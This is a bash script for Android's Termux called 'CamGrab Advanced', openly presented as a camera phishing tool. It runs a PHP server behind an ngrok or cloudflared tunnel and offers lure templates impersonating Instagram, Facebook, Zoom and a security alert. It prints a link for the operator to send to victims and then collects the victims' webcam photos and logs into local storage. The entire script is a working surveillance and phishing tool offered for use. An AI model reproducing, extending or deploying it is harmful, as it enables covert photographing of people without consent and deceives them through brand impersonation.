#!/data/data/com.termux/files/usr/bin/bash

#############################################
#   CamGrab Advanced - Termux Edition      #
#   Camera Phishing Tool with GPS & Info   #
#############################################

# Colors for better UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Storage paths
STORAGE_PATH="/sdcard/CamGrabs"
LOG_PATH="$STORAGE_PATH/logs"
CAMSHOTS_DIR="camshots"
LOGS_DIR="logs"

# Create directories
mkdir -p "$STORAGE_PATH" "$LOG_PATH" "$CAMSHOTS_DIR" "$LOGS_DIR"

# Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo "  ╔═══════════════════════════════════════╗"
    echo "  ║      CamGrab Advanced v2.0           ║"
    echo "  ║   Advanced Camera Phishing Tool      ║"
    echo "  ╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

# Check dependencies
check_dependencies() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    local missing_deps=()
    
    if ! command -v php &> /dev/null; then
        missing_deps+=("php")
    fi
    
    if ! command -v curl &> /dev/null; then
        missing_deps+=("curl")
    fi
    
    if ! command -v ngrok &> /dev/null && ! command -v cloudflared &> /dev/null; then
        echo -e "${YELLOW}[!] Neither ngrok nor cloudflared found${NC}"
        missing_deps+=("ngrok or cloudflared")
    fi
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing dependencies: ${missing_deps[*]}${NC}"
        echo -e "${YELLOW}[?] Install them? (y/n): ${NC}"
        read -r install_choice
        if [[ $install_choice == "y" || $install_choice == "Y" ]]; then
            install_dependencies
        else
            echo -e "${RED}[!] Cannot proceed without dependencies${NC}"
            exit 1
        fi
    else
        echo -e "${GREEN}[✓] All dependencies found${NC}"
    fi
}

# Install dependencies
install_dependencies() {
    echo -e "${CYAN}[*] Installing dependencies...${NC}"
    pkg update -y
    pkg install -y php curl
    
    echo -e "${YELLOW}[?] Install ngrok (n) or cloudflared (c)? (n/c): ${NC}"
    read -r tunnel_choice
    
    if [[ $tunnel_choice == "n" || $tunnel_choice == "N" ]]; then
        pkg install -y wget unzip
        wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
        tar -xvzf ngrok-v3-stable-linux-arm64.tgz
        mv ngrok $PREFIX/bin/
        rm ngrok-v3-stable-linux-arm64.tgz
        echo -e "${GREEN}[✓] Ngrok installed${NC}"
        echo -e "${YELLOW}[!] Configure ngrok authtoken: ngrok config add-authtoken YOUR_TOKEN${NC}"
    else
        pkg install -y cloudflared
        echo -e "${GREEN}[✓] Cloudflared installed${NC}"
    fi
}

# Select template
select_template() {
    echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║       Select Phishing Template       ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}1)${NC} Default (Simple Camera)"
    echo -e "${YELLOW}2)${NC} Instagram Verification"
    echo -e "${YELLOW}3)${NC} Facebook Security Check"
    echo -e "${YELLOW}4)${NC} Zoom Camera Test"
    echo -e "${YELLOW}5)${NC} Security Alert"
    echo -e "${CYAN}───────────────────────────────────────${NC}"
    echo -ne "${GREEN}[?] Choose template (1-5): ${NC}"
    read -r template_choice
    
    case $template_choice in
        1) cp index.html index_backup.html 2>/dev/null ;;
        2) cp templates/instagram.html index.html ;;
        3) cp templates/facebook.html index.html ;;
        4) cp templates/zoom.html index.html ;;
        5) cp templates/security.html index.html ;;
        *) echo -e "${RED}[!] Invalid choice, using default${NC}" ;;
    esac
}

# Start tunneling service
start_tunnel() {
    echo -e "${CYAN}[*] Starting tunnel service...${NC}"
    
    if command -v ngrok &> /dev/null; then
        echo -e "${BLUE}[*] Using Ngrok${NC}"
        ngrok http 8080 > /dev/null 2>&1 &
        sleep 5
        url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z./?=_-]*' | head -n 1)
    elif command -v cloudflared &> /dev/null; then
        echo -e "${BLUE}[*] Using Cloudflared${NC}"
        cloudflared tunnel --url localhost:8080 > tunnel.log 2>&1 &
        sleep 8
        url=$(grep -o 'https://[0-9a-zA-Z.-]*\.trycloudflare.com' tunnel.log | head -n 1)
    else
        echo -e "${RED}[!] No tunnel service available${NC}"
        exit 1
    fi
    
    if [ -n "$url" ]; then
        echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║          URL Generated!              ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        echo -e "${YELLOW}[*] Send this link: ${CYAN}$url${NC}"
        echo ""
        echo -e "${PURPLE}[*] Captured data will be saved to:${NC}"
        echo -e "    ${BLUE}Photos: $STORAGE_PATH${NC}"
        echo -e "    ${BLUE}Logs: $LOG_PATH${NC}"
    else
        echo -e "${RED}[!] Failed to generate tunnel URL${NC}"
        kill $php_pid
        exit 1
    fi
}

# Monitor captures
monitor_captures() {
    echo -e "${GREEN}[*] Monitoring for captures...${NC}"
    echo -e "${YELLOW}[*] Press CTRL+C to stop${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    
    local capture_count=0
    
    while true; do
        # Move captured photos
        if [ -d "$CAMSHOTS_DIR" ]; then
            for file in "$CAMSHOTS_DIR"/*.jpg; do
                if [ -f "$file" ]; then
                    mv "$file" "$STORAGE_PATH/" 2>/dev/null
                    ((capture_count++))
                    echo -e "${GREEN}[✓] Photo captured! Total: $capture_count${NC}"
                    
                    # Send notification (if termux-notification available)
                    if command -v termux-notification &> /dev/null; then
                        termux-notification --title "CamGrab" --content "New photo captured! Total: $capture_count"
                    fi
                fi
            done
        fi
        
        # Move logs
        if [ -d "$LOGS_DIR" ]; then
            mv "$LOGS_DIR"/* "$LOG_PATH/" 2>/dev/null
        fi
        
        sleep 2
    done
}

# Cleanup on exit
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    kill $php_pid 2>/dev/null
    pkill ngrok 2>/dev/null
    pkill cloudflared 2>/dev/null
    
    # Show statistics
    photo_count=$(find "$STORAGE_PATH" -name "*.jpg" 2>/dev/null | wc -l)
    log_count=$(find "$LOG_PATH" -name "*.json" 2>/dev/null | wc -l)
    
    echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║           Session Summary            ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
    echo -e "${CYAN}Photos captured: ${YELLOW}$photo_count${NC}"
    echo -e "${CYAN}Logs collected: ${YELLOW}$log_count${NC}"
    echo -e "${BLUE}[*] All data saved to $STORAGE_PATH${NC}"
    exit 0
}

trap cleanup INT

# Main execution
main() {
    show_banner
    check_dependencies
    select_template
    
    # Start PHP server
    echo -e "${CYAN}[*] Starting PHP server...${NC}"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    php_pid=$!
    sleep 2
    
    start_tunnel
    monitor_captures
}

main
